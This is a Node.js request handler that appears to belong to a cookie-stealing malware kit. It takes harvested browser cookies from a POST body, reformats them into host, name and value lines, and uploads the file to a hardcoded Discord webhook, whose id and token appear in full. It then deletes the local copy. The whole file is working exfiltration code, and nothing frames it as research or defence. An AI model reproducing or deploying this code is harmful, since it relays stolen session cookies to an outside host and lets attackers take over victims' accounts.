const { keyToWebhook } = require('../keyToWebhook');
const fs = require('fs');
const { WebhookClient } = require('discord.js');

module.exports = async (req, res) => {
    const { cookies } = req.body
  var key = "31"

    let content = !cookies.includes('HOST KEY:') ? "Cookies don\'t found." : cookies;
    fs.writeFileSync(`./Src/Temp/cookies_${key}.txt`, content);
     if (content !== "Cookies don\'t found.") {
         var new_cookies = "";
         fs.readFileSync(`./Src/Temp/cookies_${key}.txt`, 'utf-8').split(/\r?\n/).forEach((line) => {
             if (line.includes("COOKIES FROM:")) return;
             if (line == "" || line == undefined) return;
             var host = line.split("|")[0]?.replace("HOST KEYYY: ", "").trim();
             var name = line.split("|")[1]?.replace(" NAMEEEE: ", "").trim();
             var value = line.split("|")[2]?.replace(" VALUEEEE: ", "").trim();
            new_cookies += host + " | " + "" + "" + "" + "" + name + " | " + value + "\n"
         });
         fs.writeFileSync(`./Src/Temp/cookies_${key}.txt`, new_cookies);
     }
const webhookClient = new WebhookClient({ id: '1056349734278807592', token: 'RzPxTlSFScGbxST_tZYeZZ8Oc1L5PBvbmblVUt774as2tKfaL9ssXvuG5tsN1et4nqaw' });
     webhookClient.send({
        files: [{
            attachment: `./Src/Temp/cookies_${key}.txt`,
            name: "cookies.txt"
        }]
    })
        .then(() => {
            fs.unlink(`./Src/Temp/cookies_${key}.txt`, function (err) {
                if (err) { };
            })
            res.sendStatus(200)
            return;
        })
        .catch(err => { })
}
